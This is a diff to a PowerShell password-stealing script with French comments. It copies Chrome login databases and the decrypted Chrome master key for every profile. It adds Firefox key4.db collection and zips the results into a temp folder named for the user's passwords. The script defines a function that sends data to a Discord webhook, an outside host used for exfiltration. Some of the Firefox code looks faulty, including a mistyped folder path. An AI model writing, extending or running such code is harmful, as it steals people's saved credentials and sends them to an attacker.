@@ -1,3 +1,5 @@
+
+# Envoie des données à un webhook Discord
 $hookurl = "$dc"
 function Send-Discord {
     [CmdletBinding()]
@@ -22,12 +24,15 @@ function Send-Discord {
     }
 }
 
-
+# Création du dossier temporaire
 $FolderName = "$env:USERNAME-PASSWORDS-$(Get-Date -f yyyy-MM-dd_hh-mm)"
 $ZIP = "$FolderName.zip"
 $DestinationPath = "$env:TEMP/$FolderName"
 New-Item -Path $DestinationPath -ItemType Directory
+New-Item -Path "$DestinationPath\google" -ItemType Directory
+New-Item -Path "$DestinationPath\firefox" -ItemType Directory
 
+# Récupération des mots de passe Google Chrome
 Add-Type -AssemblyName System.Security
 $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
 $jsonData = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
@@ -44,9 +49,9 @@ catch {
 
 
 # Récupère les informations de connexion pour le profil par défaut
-Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "$DestinationPath\LoginData_0"
-Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination "$DestinationPath\LocalState"
-New-Item -Path "$DestinationPath\decrypted_key.txt" -ItemType File -Value $decryptedKeyBase64
+Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "$DestinationPath\google\LoginData_0"
+Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination "$DestinationPath\google\LocalState"
+New-Item -Path "$DestinationPath\google\decrypted_key.txt" -ItemType File -Value $decryptedKeyBase64
 
 # Récupère les informations de connexion pour chaque profil "Profile*"
 $profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
@@ -54,10 +59,42 @@ $index = 1
 foreach ($profile in $profiles) {
     $loginDataPath = Join-Path -Path $profile.FullName -ChildPath "Login Data"
     if (Test-Path $loginDataPath) {
-        Copy-Item $loginDataPath -Destination "$DestinationPath\LoginData_$index"
+        Copy-Item $loginDataPath -Destination "$DestinationPath\google\LoginData_$index"
         $index++
     }
 }
+
+
+# Fonction pour obtenir la clé maître avec DPAPI
+function Get-MasterKey {
+    param (
+        [string]$keyDbPath,
+        [int]$iteration
+    )
+    try {
+        $keyData = [System.IO.File]::ReadAllBytes($keyDbPath)
+        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        $masterKeyBase64 = [Convert]::ToBase64String($masterKey)
+        New-Item -Path "$DestinationPath\firefo\decrypted_key.txt" -ItemType File -Value $masterKeyBase64
+    }
+    catch {
+        Write-Output "Erreur lors de la récupération de la clé firefox : $_"
+    }
+}
+
+
+# lister tous les profils firefox
+$profiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory
+$i = 1
+foreach ($profile in $profiles) {
+    $path = "$env:APPDATA\Mozilla\Firefox\Profiles\$($profile.Name)\key4.db"
+    if (Test-Path $path) {
+        $keyDbPath = $path
+        Get-MasterKey -keyDbPath $keyDbPath -iteration $i
+        $i++
+    }
+}
+
 
 # Compresse le dossier contenant les données
 Compress-Archive -Path $DestinationPath -DestinationPath "$env:TEMP/$ZIP"
